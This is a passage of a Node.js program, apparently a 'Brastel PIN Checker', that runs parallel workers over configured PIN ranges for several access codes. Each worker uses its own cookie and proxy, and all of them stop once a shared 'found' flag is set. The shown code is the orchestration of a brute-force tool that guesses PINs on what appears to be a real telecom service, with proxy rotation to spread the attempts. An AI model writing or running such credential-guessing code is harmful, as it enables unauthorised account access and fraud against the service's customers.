      const workerPinChecker = new PinChecker(this.logger, this.proxyManager, this.fileManager, this.accessCode);

      // Share the 'found' state from the main pinChecker so all workers can see when to stop
      Object.defineProperty(workerPinChecker, 'found', {
        get: () => this.pinChecker.found,
        set: (value) => { this.pinChecker.found = value; }
      });

      const worker = new Worker(i + 1, this.logger, this.proxyManager, workerPinChecker, this.fileManager);
      const cookie = CONFIG.cookies[i] || CONFIG.cookies[0]; // Fallback to first cookie
      const staticProxy = CONFIG.proxies[i] || ''; // Fallback to unused proxy

      // Process available PINs directly
      workers.push(worker.processAvailablePins(pinBatches[i] || [], cookie, staticProxy));
    }

    await Promise.all(workers);

    this.logger.success(`Completed processing accessCode: ${this.accessCode}`);

    // Display final statistics
    this.displayStats();

    return true; // Continue to next accessCode
  }
}

/**
 * Main application class - handles multiple accessCodes
 */
class BrastelPinChecker {
  constructor() {
    this.accessCodes = CONFIG.accessCodes;
  }

  /**
   * Display application header
   */
  displayHeader() {
    console.log('🚀 Starting Brastel PIN Checker with Multiple AccessCodes...');
    console.log(`📋 Total AccessCodes to process: ${this.accessCodes.length}`);
    console.log(`⚠️ Per-worker undefined limit: ${CONFIG.maxUndefinedResults}`);
    console.log('==========================================');
  }

  /**
   * Display application footer
   */
  displayFooter() {
    console.log('\n🎉 All AccessCodes processing completed.');
  }

  /**
   * Process single access code
   * @param {Object} accessCodeConfig - Access code configuration
   * @param {number} index - Index of current access code
   * @returns {Promise<boolean>} True if should continue
   */
  async processAccessCode(accessCodeConfig, index) {
    console.log(`\n🎯 Processing AccessCode ${index + 1}/${this.accessCodes.length}: ${accessCodeConfig.accessCode}`);
    console.log('==========================================');

    const checker = new SingleAccessCodeChecker(accessCodeConfig);
    const shouldContinue = await checker.start();

    if (!shouldContinue) {
      console.log('\n❌ Stopping all processing due to global undefined limit exceeded.');
      return false;
    }

    // If this is not the last accessCode, show transition message
    if (index < this.accessCodes.length - 1) {
      console.log(`\n✅ Completed ${accessCodeConfig.accessCode}. Moving to next accessCode...`);
      console.log('==========================================');
    }

    return true;
  }

  /**
   * Validate configuration
   * @throws {Error} If configuration is invalid
   */
  validateConfiguration() {
    if (!Array.isArray(this.accessCodes) || this.accessCodes.length === 0) {
      throw new Error('No access codes configured');
    }

    for (const config of this.accessCodes) {
      if (!config.accessCode || !config.pinRange) {
        throw new Error('Invalid access code configuration');
      }
      if (config.pinRange.start > config.pinRange.end) {
        throw new Error(`Invalid PIN range for ${config.accessCode}`);
      }
    }
  }

  /**
   * Start the PIN checking process for all accessCodes
   */
  async start() {
    try {
      this.validateConfiguration();
      this.displayHeader();

      for (let i = 0; i < this.accessCodes.length; i++) {
        const shouldContinue = await this.processAccessCode(this.accessCodes[i], i);
        if (!shouldContinue) break;
      }

      this.displayFooter();
    } catch (error) {
      console.error(`❌ Application error: ${error.message}`);
      throw error;
    }
  }
}

// Start the application
if (require.main === module) {
  const app = new BrastelPinChecker();
  app.start().catch(error => {
    console.error('Fatal error:', error);
    process.exit(1);
  });
}

module.exports = {
  BrastelPinChecker,
  CONFIG,
  Utils,
  LOG_LEVELS,
  API_RESULT_CODES
};
